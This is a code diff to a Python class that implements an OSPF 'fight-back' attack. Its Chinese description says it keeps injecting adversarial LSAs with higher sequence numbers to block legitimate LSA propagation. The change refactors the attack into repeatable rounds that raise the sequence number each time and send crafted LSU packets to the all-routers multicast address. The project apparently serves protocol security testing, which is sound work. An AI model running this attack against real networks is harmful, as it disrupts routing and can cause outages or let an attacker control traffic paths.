@@ -8,6 +8,7 @@ class FightBackAttack(BaseAttack):
     name = "fight-back"
     description = "持续注入更高序列号的对抗 LSA 阻止合法 LSA 传播"
     category = AttackCategory.LSA
+    needs_repeated = True
     config: LSAConfig
 
     def setup(self) -> None:
@@ -16,14 +17,20 @@ class FightBackAttack(BaseAttack):
             packet_rate=self.config.packet_rate,
             max_packets=self.config.max_packets,
         )
-        self._seq = self.config.sequence_number
+        self._seq = max(self.config.sequence_number, 0x80000001)
 
-    def launch(self) -> AttackResult:
-        from ospf_attack.network.adapter import get_local_ip
-        src_ip = get_local_ip(self.config.iface)
-        seq = max(self._seq, 0x80000001)
-        if self._sender.sent_count > 0:
-            seq = min(0x7FFFFFF0 + self._sender.sent_count, 0x7FFFFFFF)
+    def send_one_round(self) -> bool:
+        src_ip = getattr(self, "_src_ip", None)
+        if src_ip is None:
+            from ospf_attack.network.adapter import get_local_ip
+            src_ip = get_local_ip(self.config.iface)
+            self._src_ip = src_ip
+
+        seq = self._seq
+        if seq < 0x7FFFFFFF:
+            seq += 1
+        self._seq = seq
+
         lsa = build_lsa_header(
             lsa_type=self.config.lsa_type,
             link_state_id=self.config.link_state_id or self.config.router_id,
@@ -32,15 +39,18 @@ class FightBackAttack(BaseAttack):
         )
         pkt = build_lsu_packet(
             router_id=self.config.router_id, area_id=self.config.area_id,
-            src_ip=src_ip, dst_ip=OSPF_MULTICAST_ALL, lsa_count=1,
+            src_ip=self._src_ip, dst_ip=OSPF_MULTICAST_ALL, lsa_count=1,
         )
         pkt = pkt / lsa
-        ok = self._sender.send_raw(pkt)
+        return self._sender.send_raw(pkt)
+
+    def launch(self) -> AttackResult:
+        ok = self.send_one_round()
         return AttackResult(success=ok, packets_sent=self._sender.sent_count,
-                           target_affected=False, details="Fight-Back 攻击")
+                           target_affected=False, details=f"Fight-Back 攻击: seq={self._seq}")
 
     def verify(self) -> bool:
-        return self._sender.sent_count > 0
+        return self._sender.sent_count > 1
 
     def teardown(self) -> None:
         pass
